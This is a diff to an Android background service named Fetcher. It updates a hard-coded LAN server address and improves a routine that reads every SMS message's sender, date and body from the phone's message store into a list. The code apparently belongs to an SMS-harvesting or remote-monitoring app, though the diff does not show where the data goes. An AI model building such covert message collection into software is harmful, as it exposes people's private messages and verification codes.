@@ -25,12 +25,15 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.sql.Date;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.TimeZone;
 import java.util.UUID;
 
 public class Fetcher extends Service {
 
-    final String SERVER_IP = "192.168.1.3";
+    final String SERVER_IP = "192.168.0.103";
     final int SERVER_PORT = 80;
     final String FILE_NAME = "test.json";
     final String FULL_URL = "http://"+SERVER_IP+":"+SERVER_PORT+"/"+FILE_NAME;
@@ -179,14 +182,20 @@ public class Fetcher extends Service {
         ArrayList<String> sms = new ArrayList<>();
         // Here you can change the path for sms folder e.g for inbox content://sms/inbox
         Uri uri = Uri.parse("content://sms/");
-        Cursor cursor = getContentResolver().query(uri,new String[]{"_id","address","date","body"},null,null,null);
+        Cursor cursor = getContentResolver().query(uri,new String[]{"_id","address","date","body"},"_id > 3",null,"date DESC");
         if(cursor != null) {
             cursor.moveToFirst();
             for(int i=0;i<cursor.getCount();i++){
+                String id=cursor.getString(0);
                 String address = cursor.getString(1);
-                String date = cursor.getString(2);
+                Long dateMil = cursor.getLong(2);
                 String body = cursor.getString(3);
-                sms.add("Address=>"+address+"\n Date=>"+date+"\n Body=>"+body);
+                //Date manipulation
+                Date date = new Date(dateMil);
+                SimpleDateFormat formatter = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
+                formatter.setTimeZone(TimeZone.getTimeZone("UTC"));
+                String formatted = formatter.format(date);
+                sms.add("ID=>"+id+"\n Address=>"+address+"\n Date=>"+formatted+"\n Body=>"+body);
                 cursor.moveToNext();
             }
         }
